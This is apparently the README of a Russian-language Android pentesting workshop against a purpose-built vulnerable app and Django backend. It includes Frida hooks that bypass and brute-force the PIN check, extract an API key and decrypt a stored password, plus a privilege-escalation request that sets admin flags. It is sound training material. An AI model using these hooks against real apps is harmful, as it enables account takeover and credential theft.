# Workshop: Как взламывают android-приложения и что после этого бывает.

[Видеозапись](https://www.youtube.com/watch?v=x1d1ZnxHUms)

## Структура репозитория

* `frida-tools` - набор скриптов для Frida применяемых в workshop-е
* `vulnerable-app` - исходный код уязвимого android-приложения
* `vulnerable-backend` - исходный код уязвимого сервера на Django
* `Insomnia_workspace.json` - некоторые запросы для импорта в `Insomnia`
* `Workshop.pdf` - презентация с теоретическим минимумом и контактами

## Требования к участникам

1. Уровень Middle+
2. Базовые навыки по работе в терминале
3. Смартфон с правами root (очень желательно Magisk), режимом разработчика, включенной отладкой по USB и возможностью установки приложений из недоверенных источников. Допускаются эмуляторы, но решать с ними проблемы придется самостоятельно
4. Предустановленный софт: python 3.6+, docker, jdk8, Android SDK 24.0.3+

## Постановка задачи

Есть клиент-серверное приложение с авторизацией, регистрацией и аутентификацией по pin-коду. Нужно найти в нем максимальное количество уязвимостей в соответствии с классификацией OWASP Mobile Top Ten.

## Инструменты и уязвимости приложения

### [MobSF (на домашнее изучение)](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

Установка
```shell
$ docker pull opensecurity/mobile-security-framework-mobsf
$ docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
```

### [Drozer](https://github.com/FSecureLABS/drozer)

Скачать и установить drozer-agent.apk на устройство

```shell
$ wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
$ adb install drozer-agent-2.3.4.apk
```

Если используется эмулятор, то нужно перенаправить порты:
```shell
$ adb forward tcp:31415 tcp:31415
```

Теперь можно запустить агента и включить встроенный сервер. После чего можно установить образ Droze-а и запустить его:
```shell
$ docker pull kengannonmwr/drozer_docker
$ docker run -it kengannonmwr/drozer_docker
root@25e99a93aee2:/# drozer console connect --server 192.168.14.35
dz>
```
**Для подключения нужно выяснить IP адрес смартфона**

Далее определяем поверхность атаки:
```shell
dz> list #покажет список всех доступных модулей, это на домашнее изучение
dz> run app.package.attacksurface com.redmadrobot.vulnerableapp
Attack Surface:
  2 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
```
Тут же можно сразу посмотреть манифест:
```shell
dz> run app.package.manifest  com.redmadrobot.vulnerableapp
```
Обнаружили, что включена возможность бэкапов, сделаем бэкап:
```shell
$ adb backup -f backup.ab -noapk com.redmadrobot.vulnerableapp
$ dd if=backup.ab ibs=24 skip=1 | openssl zlib -d > bakup.tar
#alternative
$ dd if=backup.ab bs=24 skip=1 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > bakup.tar
$ tar xzvf bakup.tar
```
Дальше рассматриваем то, что забэкапилось. По OWASP это **M1: Improper Platform Usage**. Смотрим, что там набэкапилось и видим частично открытые Shared Preferences. Это уже M2: Insecure Data Storage. С зашифрованным паролем разберемся чуть позже.
Теперь можно запустить MainActivity и обойти проверку pin-кода. Это соответствует **M1: Improper Platform Usage** и **M6: Insecure Authorization**.
```shell
dz> run app.activity.start --component com.redmadrobot.vulnerableapp com.redmadrobot.vulnerableapp.MainActivit
```

### [jadx-gui](https://github.com/skylot/jadx)
Устанавливаем jadx. Версия из Homebrew иногда падает при перетаскивании окна по разным мониторам. С версией из исходников такой проблемы нет.
```shell
$ brew install jadx # macOS
$ sudo pacman -S jadx # Arch Linux

#alternative
$ git clone https://github.com/skylot/jadx.git
$ cd jadx
$ ./gradlew dist
$ cd build/jadx/bin
$ ./jadx-gui
```
Дальнейшие действия относятся к **M9: Reverse Engineering** (приложение не обфусцировано и никак не защищено).
Исследуем экран авторизации. Видим, что есть кнопка, которая явно скрывается перед установкой обработчика нажатия:
```kotlin
public final class LoginFragment extends Hilt_LoginFragment {
    ...
    public void onViewCreated(View view, Bundle bundle) {
        ...
        button.setVisibility(8);
        ...
    }
    ...
}
```
Исследуем экран авторизации. Видим, что есть кнопка, которая явно скрывается перед установкой обработчика нажатия.

### [apktool](https://github.com/iBotPeaches/Apktool)
Если вы на маке, то установить можно через Homebrew
```shell
$ brew install apktool
```
Иначе ищем инструкцию [здесь](https://ibotpeaches.github.io/Apktool/install/)

Теперь можно разобрать приложение, внести правки и собрать его заново. Внесение правок подпадает под **M8: Code Tampering**
```shell
$ apktool d app-release.apk
# Set android:extractNativeLibs="true"
$ apktool b app-release --use-aapt2
```
Теперь его нужно заново подписать, т.к. после пересборки оригинальная подпись слетела.
```shell
# Generate fake signing keystore
$ keytool -genkey -v -keystore fake.keystore -storepass fake-fake -alias fake -keypass fake-fake -keyalg RSA -keysize 2048 -validity 10000

# Optimize and sign application
$ zipalign -c 4 app-release/dist/app-release.apk
$ apksigner sign --ks fake.keystore --ks-key-alias fake --ks-pass pass:fake-fake --key-pass pass:fake-fake app-release/dist/app-release.apk

# old alternative
$ jarsigner -keystore fake.keystore  -storepass fake-fake -keypass fake-fake app-release/dist/app-release.apk fake
$ zipalign -c 4 app-release/dist/app-release.
```
После этого приложение можно установить и проверить его работу
```shell
$ adb install app-release/dist/app-release.apk
```
Появилась кнопка, по нажатию на которую в логах можно увидеть список пользователей. Удобно отфильтровать эти логи по тегу полученному ранее:
```shell
adb logcat -s "USERS"
```
В соответствии с OWASP это **M4: Insecure Authentication** и **M10: Extraneous Functionality**
В ходе анализа выяснили, что запрос списка пользователей выполняется без какой либо авторизации, но в него передается ключ API. Ключ, в свою очередь загружается из нативной библиотеки `libnetwork.so`. Ей и займемся на следующем этапе.

### [Ghidra](https://github.com/NationalSecurityAgency/ghidra)

Если доверяете NSA, то можно скачать и запустить уже собранный билд, но лучше [собирать](https://github.com/NationalSecurityAgency/ghidra/blob/master/DevGuide.md) самостоятельно из исходников. Американцы дают качать бинарники только с американских ip-шников, поэтому нужен VPN. Если он есть, то скачать можно [здесь](https://ghidra-sre.org/ghidra_9.1.2_PUBLIC_20200212.zip). Если нет, то я [скачал](https://yadi.sk/d/PiVO_0ivMDmTHg) его за вас.

В Ghidra нужно открыть файл `libnetwork.so`, найти там функцию `Java_com_redmadrobot_vulnerableapp_ui_login_LoginViewModel_getApiKey` и извлечь из нее ключ API.

### [Objection](https://github.com/sensepost/objection)

Еще хочу показать альтернативу большим и сложным инструментам типа Ghidra. Поскольку ключ API все равно появляется в JVM коде его можно перехватить во время выполнения. Проще всего это сделать с помощью **Objection**

Установка
```shell
$ pip3 install objection
```

Теперь можно подключиться к нашему приложению (оно должно быть запущено):
```shell
$ objection --gadget com.redmadrobot.vulnerableapp explore
```
Вот несколько полезных команд:
```shell
[usb] # android hooking list activities
[usb] # android hooking get current_activity
```

Но нам нужно перехватить вызов метода `getApiKey()`. Для этого убедимся, что такой метод есть в `LoginViewModel`
```shell
[usb] # android hooking list class_methods com.redmadrobot.vulnerableapp.ui.login.LoginViewModel
...
public final native java.lang.String com.redmadrobot.vulnerableapp.ui.login.LoginViewModel.getApiKey()
...
```
Теперь у нас есть вся информация чтобы захукать этот метод
```shell
[usb] # android hooking watch class_method com.redmadrobot.vulnerableapp.ui.login.LoginViewModel.getApiKey --dump-return
```
Теперь нужно нажать на кнопку еще раз и увидеть ключ API. Его нужно сохранить, он нам пригодится позже.

### [Frida](https://github.com/frida/frida)

Установка
```shell
$ pip install frida-tools
```

Далее, если у вас Magisk, то можно установить модуль MagiskFrida. В качестве альтернативы можно воспользовать вот [этим](https://github.com/dineshshetty/FridaLoader) репозиторием. В противном случае придется ставить все руками. Скачиваем [отсюда](https://github.com/frida/frida/releases/tag/12.11.17) бинарник сервера (frida-server-12.11.17-android*), распаковываем и закидываем на устройство:
```shell
$ adb push frida-server-12.11.17-android-arm /data/local/tmp
$ adb shell
$ su
# chmod 755 /data/local/frida-server-12.11.17-android-arm
# ./data/local/frida-server-12.11.17-android-arm &
```
Далее нужно выйти из adb и убедиться, что все работает
```shell
$ frida-ps -U
PID  Name
-----  --------------------------------------------------
  226  adbd
14778  android.process.acore
12817  android.process.media
  213  bridgemgrd
 1467  com.android.certinstaller
  854  com.android.chrome
```
Теперь можно попробовать достать ключ API с помощью голой фриды. Для начала нужно написать сам хук на JavaScript
```jsx
console.log("[*] Hook is loaded");

Java.perform(function () {
    console.log("[*] Run instrumentation");

    var nativeInspection = Java.use("com.redmadrobot.vulnerableapp.ui.login.LoginViewModel")

    nativeInspection.getApiKey.overload().implementation = function () {
        console.log("[*] Calling getApiKey()")

        var key = this.getApiKey()
        console.log(">>> API key: " + key)

        return key
    }
});
```
И запустить его через фриду
```bash
$ frida -U -l hooks/intercept_apikey.js -f com.redmadrobot.vulnerableapp --no-pause
```
В качестве альтернативы, можно написать свой скрипт на python для запуска таких хуков. Это позволит реализовывать более сложные сценарии. В базовом варианте этот скрипт может выглядеть так:
```python
import time

import click
import frida

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

@click.command()
@click.option('-p', '--package', prompt='Package name', help='Application package name')
@click.option('-h', '--hook', prompt='Hook', help='Path to the .js hook file')
def run_hook(package: str, hook: str):
    device = frida.get_usb_device()
    pid = device.spawn([package])
    device.resume(pid)
    time.sleep(1)

    session = device.attach(pid)

    script = session.create_script(open(hook).read())
    script.on("message", on_message)
    script.load()

    input()

if __name__ == '__main__':
    run_hook()
```
А запустить хук можно таким образом
```bash
$ python hook.py -p com.redmadrobot.vulnerableapp -h hooks/intercept_apikey.js
```
Но с помощью фриды можно делать вещи поинтереснее чем просто перехватывать результаты функции. В приложении есть экран ввода пинкода и мы попробуем поломать его двумя способами:

- подменить возврат валидатора пинкода чтобы любой пинкод был валидным
- подобрать реальный пинкод с помощью брутфорса

Чтобы решить обе эти задачи нам нужно работать с вызовом метода валидации. В данном приложении он обмазан корутинами и захукать его довольно сложно... было бы =) Но я знаю внутренние детали реализации, и поэтому могу обратиться к сразу к синхронному методу и работать уже с ним.
```jsx
console.log("[*] Hook is loaded");

Java.perform(function () {
    console.log("[*] Run instrumentation");

    var pinkman = Java.use("com.redmadrobot.pinkman.Pinkman");

    pinkman.isValidPin.implementation = function (arg) {
        console.log("[*] Call isValidPin()");

        return true;
    }
});
```
Теперь займемся брутфорсом. Нам нужно захукать тот же самый метод, но немного видоизменить наш хук добавить непосредственно процедуру подбора в случае если попытка не удалась:
```jsx
console.log("[*] Hook is loaded");

Java.perform(function () {
    console.log("[*] Run instrumentation");

    var pinkman = Java.use("com.redmadrobot.pinkman.Pinkman");
    var pinString = Java.use("java.lang.String");

    pinkman.isValidPin.implementation = function (arg) {
        console.log("[*] Call isValidPin()");

        var ret = this.isValidPin(arg);

        if (!ret) {
            console.log("[*] Starting bruteforce...");
            for (var i = 0; i <= 9999; i++) {
                var pin = (i + 100000).toString().slice(-4);

                if (this.isValidPin(pinString.$new(pin))) {
                    console.log("[*] Found: " + pin);
                    break
                } else {
                    console.log("Try: " + pin)
                }
            }
        }

        return ret;
    }
});
```
_Для работы с пин-кодами используется библиотека [Pinkman](https://github.com/RedMadRobot/PINkman)_

Ну и неплохо бы разобраться с зашифрованным паролем, который мы получили из преференсов. Анализ кода показывает, что тут вполне себе **M5: Insusufficient Cryptography**, т.к. ключ шифрования хранится в коде. Но, чтобы не разворачивать всю эту криптомашинерию самостоятельно, можно использовать фриду для расшифровки имеющегося у нас пароля, что приводит нас к **M4: Insecure Authentication**.  Но вообще, имея на руках ключ можно написать дешифратор на любом языке, останется только воровать учетные данные пользователей и отправлять их в дешифратор ;)
```jsx
console.log("[*] Hook is loaded");

Java.perform(function () {
    console.log("[*] Run instrumentation");

    var aes = Java.use("com.redmadrobot.vulnerableapp.internal.AesEncryption");

    var aesInstance = aes.$new();
    var plainText = aesInstance.decrypt("C5gQUGTWhlhetkx2G+1cdg==");

    console.log("[*] Password: " + plainText);
});
```

### [mitmproxy](https://github.com/mitmproxy/mitmproxy)

Установка
```bash
# Homebrew
$ brew install mitmproxy
# alternative
$ docker pull mitmproxy/mitmproxy
$ docker run --rm -it -p 8080:8080 mitmproxy/mitmproxy
```
После запуска прокси, нужно настроить ее на смартфоне. Для этого нужно узнать свой ip адрес, например так:
```bash
$ ifconfig en0 | grep inet
inet 192.168.1.42 netmask 0xffffff00 broadcast 192.168.1.255
```
И указать в настройках сети прокси с вашим ip и портом 8080. Теперь нужно установить сертификат, который позволит нам расшифровывать HTTPS трафик. Для этого открываем браузер и заходим на сайт [mimt.it](http://mimt.it) (этот домен обслуживает ваш локальный прокси). Там выбрать Android и скачать сертификат. Если у он не установится по нажатию, то сходить в Настройки→Безопасность→Установить сертификаты. Там выбрать VPN и приложения. Теперь зайти на [google.com](https://google.com) и убедиться, что ничего не работает, т.к. Google не доверяет этому сертификату =)
Теперь можно переходить и изучению трафика приложения. Вот [тут](https://www.stut-it.net/blog/2017/mitmproxy-cheatsheet.html) есть хороший cheat-sheet по mitmproxy. Чтобы покрыть максимальное количество кейсов, нужно разлогиниться из приложения (или почистить данные, или удалить его и поставить заново) и начать с аутентификации или регистрации. Как видим, трафик прекрасно отображается, что классифицируется как **M3: Insecure communication**.

## Инструменты и уязвимости сервера
Задачи:
- Походить по методам API через браузер, посмотреть DRF документацию, сделать вывод, что джанга
- Попробовать зайти в админку под своими учетными данными и увидеть, что у нас нет прав на доступ в админку.
- Походить по методам, которые наловили на этапе с **mitmproxy**
- Установить нужные флаги в профиле и зайти в админку под своей учетной записью

### [Insomnia](https://github.com/Kong/insomnia)

Скачать можно [отсюда](https://insomnia.rest/download/core/?). На мак ставится так:
```bash
$ brew cask install insomnia
```
Теперь можно откопать ключ API, который мы получили ранее и посмотреть, что возвращает сервер по этому запросу.

Можно посмотреть все данные всех пользователей. Самым интересным для нас является учетная запись администратора, а в частности флаги `is_superuser`  и `is_staff`. Которые у этого пользователя установлены, а у нас нет (проверить это можно получив свой профиль). Применим метод PATCH, которым мы меняли аватар пользователя, но передадим туда эти флаги.

После успешного выполнения запроса пробуем залогиниться в админку и у нас это получается.

Шах и мат 🥳

## Полезные материалы
* [Objection Tutorial](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial)
* [Frida * A world-class dynamic instrumentation framework](https://frida.re/)
* [Frida Tutorial](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial)
* [Hacking Android app with Frida](https://android.jlelse.eu/hacking-android-app-with-frida-a85516f4f8b7)
* [Shielder - FridaLab - Writeup](https://www.shielder.it/blog/2019/02/fridalab-writeup/)
* [Instrumenting Native Android Functions using Frida - NotSoSecure](https://notsosecure.com/instrumenting-native-android-functions-using-frida/)
* [How to hook Android Native methods with Frida (Noob Friendly)](https://erev0s.com/blog/how-hook-android-native-methods-frida-noob-friendly/)
* [Exploring Native Functions with Frida on Android - part 1](https://medium.com/swlh/exploring-native-functions-with-frida-on-android-part-1-bf93f0bfa1d3)
* [Frida CodeShare](https://codeshare.frida.re/)
* [FSecureLABS/drozer](https://github.com/FSecureLABS/drozer)
* [Старый Drozer MacOS не испортит](https://fi5t.xyz/posts/drozer-on-mac/)
* [Android Penetration Tools Walkthrough Series: Drozer](https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/)
* [Mitmproxy Cheat Sheet](https://www.stut-it.net/blog/2017/mitmproxy-cheatsheet.html)
* [B3nac/InjuredAndroid](https://github.com/B3nac/InjuredAndroid)
